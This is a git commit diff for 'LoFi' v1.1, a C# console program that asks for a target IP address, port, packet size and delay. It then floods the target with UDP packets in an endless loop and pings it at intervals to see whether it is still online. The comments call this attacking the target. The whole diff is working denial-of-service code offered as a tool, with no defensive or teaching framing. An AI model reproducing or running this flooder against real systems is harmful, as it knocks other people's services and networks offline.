4e0f3854f31b780941148c0571255e63a1c0a687
sketchedgrey <hunterethanknox07@gmail.com>
2021-07-04 21:54:33 -0400

    Added support for v1.1
    I added some more comments to disambiguate the code, cleared up parts of the code, and added a feature which allows you to dictate when IMCP Echo requests are sent. Hooray for v1.1!

--- LoFi/Program.cs
+++ LoFi/Program.cs
@@ -25,44 +25,48 @@ namespace LoFi
 
 
         // Parameter Variables
-        private static string address;
-        private static string payload;
-        private static string delayer;
-        private static string netport;
+        private static string address; // This variable acts as the target
+        private static string payload; // This variable is the input on how many bytes of data should be sent in a packet
+        private static string delayer; // This variable handles the delay between packet launches
+        private static string netport; // This variable handles the port number which should be attacked
+        private static string pingers; // This variable handles the delay between IMCP Echo requests.
 
         // Payload parsed value
         private static string parseload = "";
 
+        // Main menu panel
         private static void Main(string[] args)
         {
             // Set console size and color
             Console.SetWindowSize(65, 25);
             Console.BackgroundColor = ConsoleColor.Black;
 
+
             // Write titles
             Color(6);
             Console.Clear();
-            Console.Title = "♫  L O F I  ( v 1 . 0 )  ♫";
+            Console.Title = "♫  L O F I  ( v 1 . 1 )  ♫";
             Console.WriteLine(title);
             Color(0);
 
             // Set parameters
             Parameters("Enter the IP Address of your target.", 1);
-            Parameters("Enter the port number of your target", 2);
-            Parameters("Enter the desired packet size (bytes).", 3);
-            Parameters("Enter the desired packet delay (milliseconds).", 4);
+            Parameters("Enter the port number of your target.", 2);
+            Parameters("Enter your desired packet size (bytes).", 3);
+            Parameters("Enter your desired UDP packet delay (milliseconds).", 4);
+            Parameters("How often would you like to test your connection?", 5);
 
-            // Convert parameters
+            // Convert payload parameter to how many zeroes represented in the variable
             for (int i = 0; i < int.Parse(payload); i++)
             {
                 parseload += "0";
             }
 
-            // Ping the target
-            Ping();
+            // Attack the target
+            Attack();
         }
 
-        // Get parameters
+        // Set parameters
         private static void Parameters(string question, int switcher)
         {
             Color(4);
@@ -79,6 +83,7 @@ namespace LoFi
             Color(0);
             string input = Console.ReadLine();
 
+            // Actually assign the input to the parameters
             switch (switcher)
             {
                 case 1:
@@ -93,32 +98,38 @@ namespace LoFi
                 case 4:
                     delayer = input;
                     break;
+                case 5:
+                    pingers = input;
+                    break;
             }
         }
 
-        // Ping the target
-        private static void Ping()
+        // Attack the target
+        private static void Attack()
         {
-            // Line break
             Console.WriteLine();
 
-            // Change the title to a cool attacking animation
-            Thread attackontitle = new(AttackOnTitle);
+            // Animates the title
+            Thread attackontitle = new(Animation);
             attackontitle.Start();
 
-            Socket pinger = new(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
-            byte[] pingload = Encoding.ASCII.GetBytes(parseload);
+            // Create a new socket for UDP packout outflow
+            Socket flooder = new(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
+            byte[] floodload = Encoding.ASCII.GetBytes(parseload);
             IPEndPoint endpoint = new(IPAddress.Parse(address), int.Parse(netport));
 
-            int i = 1;
-            int pluscolor = 1;
-            int packets = 0;
+            // Create integers used in attacking process
+            int i = 0; // Used for IMCP Echo control
+            int pluscolor = 1; // Used to controllm text color
+            int packets = 0; // Used to count the total packets sent
 
+            // Loop attack process
             while (true)
             {
+                // Attempt to send UPD packet
                 try
                 {
-                    pinger.SendTo(pingload, endpoint);
+                    flooder.SendTo(floodload, endpoint);
                     packets++;
                 }
                 catch (Exception ex)
@@ -127,7 +138,7 @@ namespace LoFi
                 }
                 i++;
 
-                if (i == 8)
+                if (i == int.Parse(pingers))
                 {
                     // Do some garbage collection
                     GC.Collect();
@@ -143,11 +154,12 @@ namespace LoFi
                     PingOptions options = new(64, true);
                     try
                     {
+                        // Print offline message and/or packet diagnostics
                         PingReply reply = pingSender.Send(address, timeout, buffer, options);
                         if (reply.Status == IPStatus.Success)
                         {
-                            Console.WriteLine("♫ Pinged : " + address + " : " + netport + " : TTL " + reply.Options.Ttl + "ms : RT " + reply.RoundtripTime + "ms : " + packets + "*" + payload);
-                            i = 1;
+                            Console.WriteLine("♫ Pinged : " + address + " : " + netport + " : TTL " + reply.Options.Ttl + "ms : RT " + reply.RoundtripTime + "MS : " + packets + "*" + payload);
+                            i = 0;
                         }
                         else
                         {
@@ -169,6 +181,7 @@ namespace LoFi
                     }
                 }
 
+                // Delay packets
                 Thread.Sleep(int.Parse(delayer));
             }
         }
@@ -202,8 +215,8 @@ namespace LoFi
             }
         }
 
-        // Changes the title and other superficial features
-        private static void AttackOnTitle()
+        // Animates the title
+        private static void Animation()
         {
             while (true)
             {
